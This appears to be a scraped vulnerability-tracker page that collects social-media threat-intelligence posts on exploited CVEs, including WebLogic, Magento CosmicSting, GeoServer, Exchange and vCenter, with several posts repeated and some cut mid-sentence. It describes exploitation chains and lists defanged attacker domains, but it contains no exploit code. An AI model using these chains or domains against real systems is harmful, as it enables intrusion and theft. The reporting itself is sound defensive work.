  • CVE-2020-14883 (7.2 high, disclosed 21 October 2020, in KEV) Oracle WebLogic Server Unspecified Vulnerability

#8220gang #cybercrime #cryptomining #CVE_2017_10271 #CVE_2020_14883 #vulnerability #eitw #oracle #weblogic #threatintel #infosec #cybersecurity #cyberthreatintelligence #CTI #IOC

##
screaminggoat@infosec.exchange at 2024-09-30T13:44:03.000Z ##

Sekoia: Hadooken and K4Spreader: The 8220 Gang's Latest Arsenal
Sekoia was able to capture the full attack chain of the Chinese origin cybercriminal 8220 Gang, from targeting CVE-2017-10271 and CVE-2020-14883 in Oracle Weblogic servers to deploy Python and Bash scripts, execute K4Spreader malware, which then delivered the Tsunami backdoor and a cryptominer. There are similarities with Aqua's blog post about Hadooken malware from 12 September 2024. Sekoia covers these different infection chains, the connections with the 8220 Gang, and the cross-references with the Hadooken case previously documented by Aqua. Indicators of compromise are listed on their GitHub repo.

References:

  • CVE-2017-10271 (7.5 high, disclosed 19 October 2017, in KEV) Oracle Corporation WebLogic Server Remote Code Execution Vulnerability
  • CVE-2020-14883 (7.2 high, disclosed 21 October 2020, in KEV) Oracle WebLogic Server Unspecified Vulnerability

##
screaminggoat@infosec.exchange at 2024-09-30T13:44:03.000Z ##

Sekoia: Hadooken and K4Spreader: The 8220 Gang's Latest Arsenal
Sekoia was able to capture the full attack chain of the Chinese origin cybercriminal 8220 Gang, from targeting CVE-2017-10271 and CVE-2020-14883 in Oracle Weblogic servers to deploy Python and Bash scripts, execute K4Spreader malware, which then delivered the Tsunami backdoor and a cryptominer. There are similarities with Aqua's blog post about Hadooken malware from 12 September 2024. Sekoia covers these different infection chains, the connections with the 8220 Gang, and the cross-references with the Hadooken case previously documented by Aqua. Indicators of compromise are listed on their GitHub repo.

References:

  • CVE-2017-10271 (7.5 high, disclosed 19 October 2017, in KEV) Oracle Corporation WebLogic Server Remote Code Execution Vulnerability
  • CVE-2020-14883 (7.2 high, disclosed 21 October 2020, in KEV) Oracle WebLogic Server Unspecified Vulnerability

#8220gang #cybercrime #cryptomining #CVE_2017_10271 #CVE_2020_14883 #vulnerability #eitw #oracle #weblogic #threatintel #infosec #cybersecurity #cyberthreatintelligence #CTI #IOC

This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts

CVE-2024-34102
(9.8 CRITICAL)

EPSS: 97.28%

updated 2024-07-18T01:00:03.197000

3 posts

Adobe Commerce versions 2.4.7, 2.4.6-p5, 2.4.5-p7, 2.4.4-p8 and earlier are affected by an Improper Restriction of XML External Entity Reference ('XXE') vulnerability that could result in arbitrary code execution. An attacker could exploit this vulnerability by sending a crafted XML document that references external entities. Exploitation of this issue does not require user interaction.

screaminggoat at 2024-10-02T14:04:53.037Z ##

Sansec: Thousands of Adobe Commerce stores hacked in competing CosmicSting campaigns
Reference: CVE-2024-34102 (9.8 critical, disclosed 11 July 2024 by Adobe as an exploited zero-day, added to KEV Catalog 17 July 2024) Adobe Commerce and Magento Open Source Improper Restriction of XML External Entity Reference (XXE) Vulnerability... aka CosmicSting

Sansec reports that 5% of all Adobe Commerce and Magento stores have been hacked since the announcement of the exploited zero-day CVE-2024-34102. Seven distinct groups are using CosmicSting attacks to plant malicious code on victim stores.

Usually, the first hacker to break into a site will secure it to keep others out. However, the CosmicSting vulnerability prevents this, leading to multiple groups fighting for control over the same store and evicting each other again and again.

Sansec lists and describes the cybercriminals:

  • Group Bobry: using whitespace encoding to hide malware in plain sight
  • Group Polyovki: using cdnstatics[.]net to embed a script
  • Group Surki: used the number 42 to encrypt its payload and operates using domain fallodick87-78[.]sbs
  • Group Burunduki: their loader uses a custom port sniffer for a websocket at wss[://]jgueurystatic[.]xyz:8101
  • Group Ondatry: builds custom malware that integrates specifically with the payment solution of that merchant.
  • Group Khomyaki: uses malware loader endppoints with two character URIs
  • Group Belki: uses CosmicSting with CNEXT for RCE, hides backdoors in files, and background processes, injects skimming malware

Indicators of compromise are all over the blog post. There are also older indicators

#threatintel #cybercrime #cosmicsting #CVE_2024_34102 #adobecommerce #magento #IOC #cyberthreatintelligence #cti #infosec #cybersecurity

##
iulianvostrut@mastodon.social at 2024-10-02T12:24:48.000Z ##

Urgent: Critical vulnerability CVE-2024-34102 impacting 5% of Adobe Commerce & Magento stores. 7 hacker groups injecting malicious scripts. Patching alone isn't enough—rotate encryption keys now! Check details at: https://t.co/FEujjbiBVU #cybersecurity

  • Group Bobry: using whitespace encoding to hide malware in plain sight
  • Group Polyovki: using cdnstatics[.]net to embed a script

CVE-2024-36401
(9.8 CRITICAL)

EPSS: 95.88%

updated 2024-07-16T01:00:01.567000

5 posts

GeoServer is an open source server that allows users to share and edit geospatial data. Prior to versions 2.23.6, 2.24.4, and 2.25.2, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions. The GeoTools library API that GeoServ

Nuclei template

1 repos

#search_error

breachhq at 2024-09-26T14:15:06.292Z ##

🚨#DataBreach🚨
In September 2024, the Chinese APT group known as Earth Baxia targeted a government organization in Taiwan and other entities within the Asia-Pacific region by exploiting a Remote Code Execution (RCE) vulnerability in GeoServer (CVE-2024-36401). This flaw, caused by unsafe evaluation of property names as XPath expressions, has a CVSS score of 9.8 and affects GeoServer versions prior to 2.23.6, 2.24.4, and 2.25.2.

The thr...
https://breach-hq.com/breaches/taiwan/2024-sep

##
jodygarnett@fosstodon.org at 2024-09-21T20:34:58.000Z ##

So here is the game. If you see a @geoserver instance, and you can read the version number on the welcome, please ask the admin to read the following post: https://geoserver.org/vulnerability/2024/09/12/cve-2024-36401.html

If you don't see a version number (whew) direct them to https://geoserver.org/behind%20the%20scenes/2024/09/10/gs3.html

There are well over 10k GeoServer’s out there; please help contact them.

#geoserver #foss4g #osgeo

##
screaminggoat@infosec.exchange at 2024-09-19T11:27:39.000Z ##

Trend Micro: Earth Baxia Uses Spear-Phishing and GeoServer Exploit to Target APAC
Trend Micro with their silly threat actor naming schema: Earth Baxia is a China-based cyber espionage group. They targeted a government organization in Taiwan, and potentially others in the Asia Pacific (APAC) region using spear-phishing emails and by leveraging CVE-2024-36401 (9.8 critical, disclosed 01 July 2024 by GeoServer, added to CISA KEV 15 July 2024, has proof of concept) OSGeo GeoServer GeoTools Eval Injection Vulnerability. The threat actor employs GrimResource and AppDomainManager injection to deploy additional payloads. Customized Cobalt Strike components were deployed on compromised machines through the two initial access vectors. The altered version of Cobalt Strike included modified internal signatures and a changed configuration structure for evasion. Earth Baxia also used a new backdoor named EAGLEDOOR, which supports multiple communication protocols for information gathering and payload delivery. IOC provided.

#CVE_2024_36401 #EarthBaxia #china #cyberespionage #threatintel #cyberthreatintelligence #CTI #IOC #infosec #cybersecurity #cobaltstrike #geoserver #vulnerability #eitw #activeexploitation #taiwan #apac

CVE-2023-37450
(8.8 HIGH)

EPSS: 0.19%

updated 2024-06-27T18:51:28.220000

2 posts

The issue was addressed with improved checks. This issue is fixed in iOS 16.6 and iPadOS 16.6, Safari 16.5.2, tvOS 16.6, macOS Ventura 13.5, watchOS 9.6. Processing web content may lead to arbitrary code execution. Apple is aware of a report that this issue may have been actively exploited.

hweimer@fediscience.org at 2024-09-30T10:17:33.000Z ##

@kuketzblog Praktisch alle Browser-Bugs für remote code execution betreffen Javascript-Code (z.B. CVE-2023-37450, CVE-2023-3420, CVE-2024-3833). Selten ist wie in CVE-2023-4863 sowas wie eine Bildbibliothek betroffen.

Wenn du eine typische Webseite gehst (z.B. Zeit), dann werden da 10-20 Javascript-Elemente von externen Unternehmen nachgeladen, und das ist nur die erste Ebene. Das erhöht massiv die Angriffsoberfläche und Chrome unter Android bietet keine Möglichkeit, sich dagegen zu wehren.

##
hweimer@fediscience.org at 2024-09-30T10:17:33.000Z ##

@kuketzblog Praktisch alle Browser-Bugs für remote code execution betreffen Javascript-Code (z.B. CVE-2023-37450, CVE-2023-3420, CVE-2024-3833). Selten ist wie in CVE-2023-4863 sowas wie eine Bildbibliothek betroffen.

Wenn du eine typische Webseite gehst (z.B. Zeit), dann werden da 10-20 Javascript-Elemente von externen Unternehmen nachgeladen, und das ist nur die erste Ebene. Das erhöht massiv die Angriffsoberfläche und Chrome unter Android bietet keine Möglichkeit, sich dagegen zu wehren.

##

CVE-2023-36777
(5.7 MEDIUM)

EPSS: 0.17%

updated 2024-05-29T03:16:01.830000

1 posts

Microsoft Exchange Server Information Disclosure Vulnerability

screaminggoat@infosec.exchange at 2024-09-19T18:24:24.000Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 3 – DLL Loading Chain for RCE
This is part 3 in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes 3 vulnerabilities in detail that, when chained together, leads to remote code execution:

  • CVE-2023-36744 (8.0 high, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Arbitrary File Write)
  • CVE-2023-36777 (5.7 medium, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Information Disclosure Vulnerability (described as Arbitrary File Read)
  • CVE-2023-36745 (8.0 high, disclosed 12, September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Local DLL Loading)

TL;DR: CVE-2023-36744 -> Arbitrary File Write through Argument Injection, which drops a malicious DLL to the local file system. The drop path is randomized and initially unknown. CVE-2023-36777 -> Arbitrary File Read, to leak the randomized drop path. CVE-2023-36745 -> Local DLL Loading to load the dropped DLL and achieve RCE as SYSTEM.

#vulnerabilityanalysis #vulnerability #microsoft #exchange #CVE #zdi #proxynotshell #CVE_2023_36745 #CVE_2023_36777 #CVE_2023_36744

##

CVE-2023-36744
(8.0 HIGH)

EPSS: 0.08%

updated 2024-05-29T03:15:59.743000

1 posts

Microsoft Exchange Server Remote Code Execution Vulnerability

screaminggoat@infosec.exchange at 2024-09-19T18:24:24.000Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 3 – DLL Loading Chain for RCE
This is part 3 in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes 3 vulnerabilities in detail that, when chained together, leads to remote code execution:

  • CVE-2023-36744 (8.0 high, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Arbitrary File Write)
  • CVE-2023-36777 (5.7 medium, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Information Disclosure Vulnerability (described as Arbitrary File Read)
  • CVE-2023-36745 (8.0 high, disclosed 12, September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Local DLL Loading)

TL;DR: CVE-2023-36744 -> Arbitrary File Write through Argument Injection, which drops a malicious DLL to the local file system. The drop path is randomized and initially unknown. CVE-2023-36777 -> Arbitrary File Read, to leak the randomized drop path. CVE-2023-36745 -> Local DLL Loading to load the dropped DLL and achieve RCE as SYSTEM.

#vulnerabilityanalysis #vulnerability #microsoft #exchange #CVE #zdi #proxynotshell #CVE_2023_36745 #CVE_2023_36777 #CVE_2023_36744

##

CVE-2023-36050
(8.0 HIGH)

EPSS: 0.06%

updated 2024-05-29T02:16:01.060000

2 posts

Microsoft Exchange Server Spoofing Vulnerability

1 repos

#search_error

screaminggoat at 2024-09-26T21:31:11.746Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 4 – No Argument Constructor
This is the 4th and final part in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes the PowerShell Remoting ConvertViaNoArgumentConstructor conversion mechanism, which allowed him to find 3 more vulnerabilities:

  • CVE-2023-36050 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as an XXE (File Read))
  • CVE-2023-36039 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)
  • CVE-2023-36035 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

Note that CVE-2023-36035 is a partial bypass of CVE-2023-36756 (8.0, disclosed 12 September 2023) Microsoft Exchange Server Remote Code Execution Vulnerability.

#ProxyNotShell #vulnerabilityanalysis #cve #microsoft #exchange

##
screaminggoat@infosec.exchange at 2024-09-26T21:31:11.000Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 4 – No Argument Constructor
This is the 4th and final part in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes the PowerShell Remoting ConvertViaNoArgumentConstructor conversion mechanism, which allowed him to find 3 more vulnerabilities:

  • CVE-2023-36050 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as an XXE (File Read))
  • CVE-2023-36039 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)
  • CVE-2023-36035 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

Note that CVE-2023-36035 is a partial bypass of CVE-2023-36756 (8.0, disclosed 12 September 2023) Microsoft Exchange Server Remote Code Execution Vulnerability.

An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller, using the Netlogon Remote Protocol (MS-NRPC). An attacker who successfully exploited the vulnerability could run a specially crafted application on a device on the network. To exploit the vulnerability, an unauthenticated attacker would be required to

screaminggoat@infosec.exchange at 2024-09-20T14:28:15.000Z ##

Trend Micro: How Ransomhub Ransomware Uses EDRKillShifter to Disable EDR and Antivirus Protections
Trend Micro reports that RansomHub actors dubbed "Water Bakunawa" (unknown if they're referring to the RansomHub group itself, or an affiliate since RansomHub is also a Ransomware-as-a-Service) are now using the EDRKillShifter tool to disable endpoint detection and response (EDR) and antivirus protections in their attack chain. They describe infection infection (but give multiple conflicting examples from phishing emails, exploiting internet facing applications with known vulnerabilities, password spraying attacks, and compromised user account, even CVE-2020-1472 (10.0 critical, disclosed 11 August 2020 by Microsoft, in CISA KEV Catalog since inauguration) Netlogon Elevation of Privilege Vulnerability aka ZeroLogon). Trend Micro describes each RansomHub TTP by MITRE technique, and maps to ATT&CK. Indicators of compromise listed.

#threatintel #ransomhub #ransomware #WaterBakunawa #infosec #IOC #CVE_2020_1472 #ZeroLogon #vulnerability #mitreattack #EDRKillShifter #cybersecurity #cyberthreatintelligence #cti #raas

CVE-2024-3640
(0 None)

EPSS: 0.04%

updated 2024-05-17T18:36:31.297000

1 posts

An unquoted executable path exists in the Rockwell Automation FactoryTalk® Remote Access™ possibly resulting in remote code execution if exploited. While running the FTRA installer package, the executable path is not properly quoted, which could allow a threat actor to enter a malicious executable and run it as a System user. A threat actor needs admin privileges to exploit this vulnerability.

A vulnerability was found in OpenRapid RapidCMS up to 1.3.1. It has been declared as critical. This vulnerability affects unknown code of the file /admin/upload.php. The name of the patch is 4dff387283060961c362d50105ff8da8ea40bcbe.

CVE-2022-24805
(6.5 MEDIUM)

EPSS: 0.04%

updated 2024-04-17T12:48:31.863000

2 posts

net-snmp provides various tools relating to the Simple Network Management Protocol. Prior to version 5.9.2, a buffer overflow in the handling of the `INDEX` of `NET-SNMP-VACM-MIB` can cause an out-of-bounds memory access. A user with read-only credentials can exploit the issue. Version 5.9.2 contains a patch. Users should use strong SNMPv3 credentials and avoid sharing the credentials.

screaminggoat at 2024-09-25T16:12:56.029Z ##

Citrix security advisory: XenServer and Citrix Hypervisor Security Update for CVE-2024-45817

  • CVE-2024-45817 (score pending, disclosed today) affects both XenServer 8 and Citrix Hypervisor 8.2 CU1 LTSR: a malicious administrator of a guest VM can cause the host to crash or become unresponsive.
  • CVE-2022-24805 (6.5 medium) net-snmp: A buffer overflow in the handling of the INDEX of NET-SNMP-VACM-MIB can cause an out-of-bounds memory access. affects XenServer 8
  • CVE-2022-24809 (6.5 medium) net-snmp: A malformed OID in a SET request to NET-SNMP-AGENT-MIB::nsLogTable can cause a NULL pointer dereference. Affects XenServer 8

No mention of exploitation. See CISA cybersecurity advisory: Citrix Releases Security Updates for XenServer and Citrix Hypervisor

#Citrix #vulnerability #CVE #CVE_2024_45817 #CVE_2022_24805 #CVE_2022_24809

##
screaminggoat@infosec.exchange at 2024-09-25T16:12:56.000Z ##

Citrix security advisory: XenServer and Citrix Hypervisor Security Update for CVE-2024-45817

  • CVE-2024-45817 (score pending, disclosed today) affects both XenServer 8 and Citrix Hypervisor 8.2 CU1 LTSR: a malicious administrator of a guest VM can cause the host to crash or become unresponsive.
  • CVE-2022-24805 (6.5 medium) net-snmp: A buffer overflow in the handling of the INDEX of NET-SNMP-VACM-MIB can cause an out-of-bounds memory access. affects XenServer 8
  • CVE-2022-24809 (6.5 medium) net-snmp: A malformed OID in a SET request to NET-SNMP-AGENT-MIB::nsLogTable can cause a NULL pointer dereference. Affects XenServer 8

No mention of exploitation. See CISA cybersecurity advisory: Citrix Releases Security Updates for XenServer and Citrix Hypervisor

#Citrix #vulnerability #CVE #CVE_2024_45817 #CVE_2022_24805 #CVE_2022_24809

##

CVE-2024-21338
(7.8 HIGH)

EPSS: 1.43%

updated 2024-04-11T21:30:45

2 posts

Windows Kernel Elevation of Privilege Vulnerability

1 repos

#search_error

screaminggoat at 2024-09-23T11:20:50.426Z ##

SentinelOne: Kryptina RaaS | From Unsellable Cast-Off to Enterprise Ransomware
Kryptina is a free and open-source Ransomware-as-a-Service (RaaS) platform written for Linux, previously reported by SentinelOne in February 2024. In May 2024, a Mallox affiliate leaked staging server data, revealing that their Linux ransomware was based on a modified version of Kryptina. The affiliate made superficial changes to source code and documentation, stripping Kryptina branding but retaining core functionality. The adoption of Kryptina by Mallox affiliates exemplifies the commoditization of ransomware tools, complicating malware tracking as affiliates blend different codebases into new variants. SentinelOne provides a brief history of both Kryptina and Mallox, description of Kryptina features and a comparison with the Mallox makefiles.

The staging server includes an exploit for CVE-2024-21338 (7.8 high, disclosed 13 February 2024 by Microsoft, reported by Avast as an exploited zero-day used by DPRK hackers, in CISA's KEV Catalog) Windows Kernel Elevation of Privilege Vulnerability. There are other Windows-focused droppers and tools on the server. Indicators of compromise are provided.

#threatintel #kryptina #mallox #raas #ransomware #infosec #cybersecurity #cyberthreatintelligence #CTI #IOC #CVE_2024_21338 #dropper

##
screaminggoat@infosec.exchange at 2024-09-23T11:20:50.000Z ##

SentinelOne: Kryptina RaaS | From Unsellable Cast-Off to Enterprise Ransomware
Kryptina is a free and open-source Ransomware-as-a-Service (RaaS) platform written for Linux, previously reported by SentinelOne in February 2024. In May 2024, a Mallox affiliate leaked staging server data, revealing that their Linux ransomware was based on a modified version of Kryptina. The affiliate made superficial changes to source code and documentation, stripping Kryptina branding but retaining core functionality. The adoption of Kryptina by Mallox affiliates exemplifies the commoditization of ransomware tools, complicating malware tracking as affiliates blend different codebases into new variants. SentinelOne provides a brief history of both Kryptina and Mallox, description of Kryptina features and a comparison with the Mallox makefiles.

The staging server includes an exploit for CVE-2024-21338 (7.8 high, disclosed 13 February 2024 by Microsoft, reported by Avast as an exploited zero-day used by DPRK hackers, in CISA's KEV Catalog) Windows Kernel Elevation of Privilege Vulnerability. There are other Windows-focused droppers and tools on the server. Indicators of compromise are provided.

#threatintel #kryptina #mallox #raas #ransomware #infosec #cybersecurity #cyberthreatintelligence #CTI #IOC #CVE_2024_21338 #dropper

EPSS: 0.08%

updated 2024-04-04T07:37:27

screaminggoat at 2024-09-26T21:31:11.746Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 4 – No Argument Constructor
This is the 4th and final part in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes the PowerShell Remoting ConvertViaNoArgumentConstructor conversion mechanism, which allowed him to find 3 more vulnerabilities:

  • CVE-2023-36050 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as an XXE (File Read))
  • CVE-2023-36039 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)
  • CVE-2023-36035 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

Note that CVE-2023-36035 is a partial bypass of CVE-2023-36756 (8.0, disclosed 12 September 2023) Microsoft Exchange Server Remote Code Execution Vulnerability.

#ProxyNotShell #vulnerabilityanalysis #cve #microsoft #exchange

##
screaminggoat@infosec.exchange at 2024-09-26T21:31:11.000Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 4 – No Argument Constructor
This is the 4th and final part in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes the PowerShell Remoting ConvertViaNoArgumentConstructor conversion mechanism, which allowed him to find 3 more vulnerabilities:

  • CVE-2023-36050 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as an XXE (File Read))
  • CVE-2023-36039 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)
  • CVE-2023-36035 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

Note that CVE-2023-36035 is a partial bypass of CVE-2023-36756 (8.0, disclosed 12 September 2023) Microsoft Exchange Server Remote Code Execution Vulnerability.

#ProxyNotShell #vulnerabilityanalysis #cve #microsoft #exchange

##

CVE-2023-36745
(8.0 HIGH)

EPSS: 0.11%

updated 2024-04-04T07:37:23

1 posts

Microsoft Exchange Server Remote Code Execution Vulnerability

1 repos

#search_error

screaminggoat@infosec.exchange at 2024-09-19T18:24:24.000Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 3 – DLL Loading Chain for RCE
This is part 3 in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes 3 vulnerabilities in detail that, when chained together, leads to remote code execution:

  • CVE-2023-36744 (8.0 high, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Arbitrary File Write)
  • CVE-2023-36777 (5.7 medium, disclosed 12 September 2023 by Microsoft) Microsoft Exchange Server Information Disclosure Vulnerability (described as Arbitrary File Read)
  • CVE-2023-36745 (8.0 high, disclosed 12, September 2023 by Microsoft) Microsoft Exchange Server Remote Code Execution Vulnerability (described as Local DLL Loading)

TL;DR: CVE-2023-36744 -> Arbitrary File Write through Argument Injection, which drops a malicious DLL to the local file system. The drop path is randomized and initially unknown. CVE-2023-36777 -> Arbitrary File Read, to leak the randomized drop path. CVE-2023-36745 -> Local DLL Loading to load the dropped DLL and achieve RCE as SYSTEM.

#vulnerabilityanalysis #vulnerability #microsoft #exchange #CVE #zdi #proxynotshell #CVE_2023_36745 #CVE_2023_36777 #CVE_2023_36744

EPSS: 0.04%

updated 2024-04-04T03:28:57

2 posts

In Shadow 4.13, it is possible to inject control characters into fields provided to the SUID program chfn (change finger). Although it is not possible to exploit this directly (e.g., adding a new user fails because \n is in the block list), it is possible to misrepresent the /etc/passwd file when viewed. Use of \r manipulations and Unicode characters to work around blocking of the : character make

CVE-2023-3420
(8.8 HIGH)

EPSS: 1.10%

updated 2024-01-31T17:15:12.290000

2 posts

Type Confusion in V8 in Google Chrome prior to 114.0.5735.198 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High)

1 repos

https://github.com/paulsery/CVE_2023_3420

hweimer@fediscience.org at 2024-09-30T10:17:33.000Z ##

@kuketzblog Praktisch alle Browser-Bugs für remote code execution betreffen Javascript-Code (z.B. CVE-2023-37450, CVE-2023-3420, CVE-2024-3833). Selten ist wie in CVE-2023-4863 sowas wie eine Bildbibliothek betroffen.

Wenn du eine typische Webseite gehst (z.B. Zeit), dann werden da 10-20 Javascript-Elemente von externen Unternehmen nachgeladen, und das ist nur die erste Ebene. Das erhöht massiv die Angriffsoberfläche und Chrome unter Android bietet keine Möglichkeit, sich dagegen zu wehren.

##
hweimer@fediscience.org at 2024-09-30T10:17:33.000Z ##

@kuketzblog Praktisch alle Browser-Bugs für remote code execution betreffen Javascript-Code (z.B. CVE-2023-37450, CVE-2023-3420, CVE-2024-3833). Selten ist wie in CVE-2023-4863 sowas wie eine Bildbibliothek betroffen.

Wenn du eine typische Webseite gehst (z.B. Zeit), dann werden da 10-20 Javascript-Elemente von externen Unternehmen nachgeladen, und das ist nur die erste Ebene. Das erhöht massiv die Angriffsoberfläche und Chrome unter Android bietet keine Möglichkeit, sich dagegen zu wehren.

CVE-2023-48693
(9.8 CRITICAL)

EPSS: 0.16%

updated 2023-12-08T19:24:21.413000

1 posts

Azure RTOS ThreadX is an advanced real-time operating system (RTOS) designed specifically for deeply embedded applications. An attacker can cause arbitrary read and write due to vulnerability in parameter checking mechanism in Azure RTOS ThreadX, which may lead to privilege escalation. The affected components include RTOS ThreadX v6.2.1 and below. The fixes have been included in ThreadX release 6

david_chisnall@infosec.exchange at 2024-09-20T11:03:19.000Z ##

For those who missed SCI Semiconductor's demo at the Digital Security by Design (DSbD) all hands meeting this week, meet Hugh the Lightbulb! We introduced a memory safety bug in the TCP/IP stack similar to CVE-2023-48693 from Azure RTOS in December or the CVE-2020-6007 in Philips Hue lightbulbs. In other systems, these allowed remote arbitrary-code execution. We showed that, in a #CHERIoT system such as SCI's upcoming ICENI line, this becomes a couple of seconds of network disconnection with no impact on the rest of the system.

All of the code for Hugh is available for people to play with.

NocoDB through 0.106.0 (or 0.109.1) has a path traversal vulnerability that allows an unauthenticated attacker to access arbitrary files on the server by manipulating the path parameter of the /download route. CVE-2023-37582
(9.8 CRITICAL)

EPSS: 0.71%

(5.9 MEDIUM)

EPSS: 0.14%

updated 2023-11-07T03:51:28.760000

1 posts

WordPress is affected by an unauthenticated blind SSRF in the pingback feature. Because of a TOCTOU race condition between the validation checks and the HTTP request, attackers can reach internal hosts that are explicitly forbidden.

1 posts

A malicious actor with network access to port 443 may exploit this issue to execute commands with unrestricted privileges on the underlying operating system that hosts vCenter Server. This affects VMware vCenter Server (7.x before 7.0 U1c, 6.7 before 6.7 U3l and 6.5 before 6.5 U3n) and VMware Clou

screaminggoat@infosec.exchange at 2024-09-20T14:31:31.000Z ##

Kaspersky: -=TWELVE=- is back
Kaspersky reports that Twelve, a hacktivism and espionage-oriented threat group that targets Russian government organizations has been observed in a June 2024 cyber attack. Twelve shares infrastructure and TTPs with the DARKSTAR ransomware group (aka Shadow or Comet), which suggests that the two belong to the same syndicate or activity cluster. Kaspersky describes their attack chain, which includes exploiting VMware vCenter vulnerabilities CVE-2021-21972 and CVE-2021-22005 (9.8 critical, remote code execution and arbitrary file upload, respectively) to install the FaceFish backdoor. The Lockbit 3.0 and Chaos ransomware used in the attacks creates a ransom note that lacks any contact methods (indicating that Twelve isn't interested in financial extortion). If that wasn't obvious enough, then the Shamoon wiper executed on infrastructure after the ransomware encryption is a good tell. Indicators of compromise provided.

#threatintel #twelve #hactivism #darkstar #infosec #IOC #CVE_2021_21972 #CVE_2021_22005 #vmware #vcenter #facefish #vulnerability #wiper #shamoon #ransomware #cybersecurity #cyberthreatintelligence #cti #cyberespionage #lockbit #chaos

##

CVE-2021-22005
(9.8 CRITICAL)

EPSS: 97.35%

updated 2023-08-08T14:21:49.707000

1 posts

The vCenter Server contains an arbitrary file upload vulnerability in the Analytics service. A malicious actor with network access to port 443 on vCenter Server may exploit this issue to execute code on vCenter Server by uploading a specially crafted file.

screaminggoat@infosec.exchange at 2024-09-20T14:31:31.000Z ##

Kaspersky: -=TWELVE=- is back
Kaspersky reports that Twelve, a hacktivism and espionage-oriented threat group that targets Russian government organizations has been observed in a June 2024 cyber attack. Twelve shares infrastructure and TTPs with the DARKSTAR ransomware group (aka Shadow or Comet), which suggests that the two belong to the same syndicate or activity cluster. Kaspersky describes their attack chain, which includes exploiting VMware vCenter vulnerabilities CVE-2021-21972 and CVE-2021-22005 (9.8 critical, remote code execution and arbitrary file upload, respectively) to install the FaceFish backdoor. The Lockbit 3.0 and Chaos ransomware used in the attacks creates a ransom note that lacks any contact methods (indicating that Twelve isn't interested in financial extortion). If that wasn't obvious enough, then the Shamoon wiper executed on infrastructure after the ransomware encryption is a good tell. Indicators of compromise provided.

CVE-2023-30799
(7.2 HIGH)

EPSS: 0.11%

updated 2023-07-28T13:47:00.313000

1 posts

MikroTik RouterOS stable before 6.49.7 and long-term through 6.48.6 are vulnerable to a privilege escalation issue. A remote and authenticated attacker can escalate privileges from admin to super-admin on the Winbox or HTTP interface. The attacker can abuse this vulnerability to execute arbitrary code on the system.

CISA: CISA Adds Four Known Exploited Vulnerabilities to Catalog
Hot off the press! Page is now live and published on their website.

  • CVE-2019-0344 (9.8 critical) SAP Commerce Cloud Deserialization of Untrusted Data Vulnerability
  • CVE-2021-4043 (5.5 medium) Motion Spell GPAC Null Pointer Dereference Vulnerability
  • CVE-2020-15415 (9.8 critical) DrayTek Multiple Vigor Routers OS Command Injection Vulnerability
  • CVE-2023-25280 (9.8 critical) D-Link DIR-820 Router OS Command Injection Vulnerability

cisakevtracker@mastodon.social at 2024-09-30T15:01:04.000Z ##

CVE ID: CVE-2021-4043
Vendor: Motion Spell
Product: GPAC
Date Added: 2024-09-30
Vulnerability: Motion Spell GPAC Null Pointer Dereference Vulnerability
